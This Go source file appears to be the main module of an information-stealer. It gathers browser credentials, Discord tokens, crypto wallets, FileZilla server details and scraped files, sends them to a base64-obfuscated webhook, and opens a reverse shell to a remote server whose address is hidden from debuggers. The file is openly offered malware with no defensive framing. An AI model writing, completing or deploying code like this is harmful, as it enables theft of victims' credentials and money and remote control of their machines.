package main

import (
	"encoding/base64"
)

type Stealer struct {
	OS      OS
	Apps    Apps
	Memory  Memory
	Network Network
}

func main() {
	// Decrypt webhook string if encrypted (will change encryption algorithm soon)
	if webhookEncrypted {
		tempDec, _ := base64.StdEncoding.DecodeString(webhookUrl)
		webhookUrl = string(tempDec)
	}

	stealer := NewStealer()
	stealer.SendEmbeds()

	// Connect to the supplied reverse shell server and handle incoming commands
	if reverseShell && (reverseShellHost != "" && reverseShellPort != "") {
		// Decrypt auto-encrypted reverse shell config (so debuggers can't find the server information in binary)
		tempHost, _ := base64.StdEncoding.DecodeString(reverseShellHost)
		tempPort, _ := base64.StdEncoding.DecodeString(reverseShellPort)
		reverseShellHost = string(tempHost)
		reverseShellPort = string(tempPort)

		client := Connect(Server{ // Returns ClientSocket containing connection to server
			Host: reverseShellHost,
			Port: reverseShellPort,
		})

		client.Listen() // Handle commands and persistence
	}
}

func NewStealer() (stealer *Stealer) {
	// Create, insert information to and return a new Stealer instance to read from in the embeds
	stealer = &Stealer{OS{}, Apps{}, Memory{}, Network{}} // Create Stealer instance

	stealer.GetNetworkAddresses()
	stealer.GetSystemInfo()

	if getBrowserCredentials {
		stealer.GetBrowserCredentials()
	}
	if getDiscordTokens {
		stealer.GetTokens()
	}
	if getWalletCredentials {
		stealer.GetWallets()
	}
	if getInstalledSoftware {
		stealer.GetInstalledSoftware()
	}
	if getNetworkConnections {
		stealer.GetNetworkConnections()
	}
	if getScrapedFiles {
		stealer.GetFileScrape()
	}
	if getFileZillaServers {
		stealer.GetFileZillaConnections()
	}

	stealer.WriteSystemJson()

	return stealer
}
